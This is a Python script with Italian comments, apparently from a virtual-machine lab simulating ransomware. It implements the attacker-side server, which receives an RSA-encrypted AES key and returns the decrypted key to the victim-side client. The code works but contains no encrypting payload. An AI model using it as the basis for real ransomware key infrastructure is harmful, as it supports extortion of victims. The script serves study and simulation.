#(Il Server su VM 1)
#Questo script funge da server di comunicazione, gestisce la chiave privata e decifra la chiave AES.

# server_decrypt_key.py - Eseguito su VM 1 (Attaccante/Server)

import socketserver
import os
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from utils import carica_chiave_rsa, PRIVATE_KEY_FILE # Importa la logica di utilità

# --- Configurazione ---
HOST, PORT = "0.0.0.0", 8082 # Ascolta su tutte le interfacce
MAX_RECV_SIZE = 4096

class KeyDecryptionHandler(socketserver.BaseRequestHandler):
    
    def handle(self):
        print(f"\n--- Connessione in arrivo da {self.client_address[0]} ---")
        
        # (1) Ricezione dei dati cifrati (chiave AES cifrata)
        encrypted_data = self.request.recv(MAX_RECV_SIZE)
        if not encrypted_data:
            return
            
        print(f"📥 Ricevuta chiave AES cifrata ({len(encrypted_data)} bytes).")
        
        # (2) Caricamento della chiave privata RSA (L'unica in grado di decifrare)
        try:
            chiave_privata = carica_chiave_rsa(PRIVATE_KEY_FILE, is_private=True)
        except Exception as e:
            print(f"❌ Errore Server: Chiave privata non disponibile. {e}")
            self.request.sendall(b"ERROR_KEY_UNAVAILABLE")
            return

        # (3) Decifratura della chiave AES con la chiave privata RSA (Key Unwrapping)
        try:
            chiave_aes_originale = chiave_privata.decrypt(
                encrypted_data,
                asym_padding.OAEP(
                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            print("✅ Chiave AES originale decifrata con successo.")

            # (4) Invio della chiave AES originale (decifrata) al client (VM 2)
            self.request.sendall(chiave_aes_originale)
            print("📤 Chiave AES decifrata inviata al client.")

        except Exception as e:
            print(f"❌ Errore durante la decifratura RSA (Dati non validi): {e}")
            self.request.sendall(b"ERROR_DECRYPT_FAILED")

if __name__ == "__main__":
    print("--- SERVER DI DECRITTATORE SIMULATO IN ASCOLTO (VM 1) ---")
    
    # Verifica esistenza chiave privata prima di avviare il server
    try:
        carica_chiave_rsa(PRIVATE_KEY_FILE, is_private=True)
    except Exception as e:
        print(f"AVVISO: {e}. Esegui 'utils.py' per generare le chiavi.")
        
    try:
        with socketserver.TCPServer((HOST, PORT), KeyDecryptionHandler) as tcpServer:
            print(f"Server pronto su {HOST}:{PORT}. Attendendo chiavi cifrate...")
            tcpServer.serve_forever()
    except KeyboardInterrupt:
        print("\nServer interrotto.")
    except Exception as e:
        print(f"Errore del server: {e}")
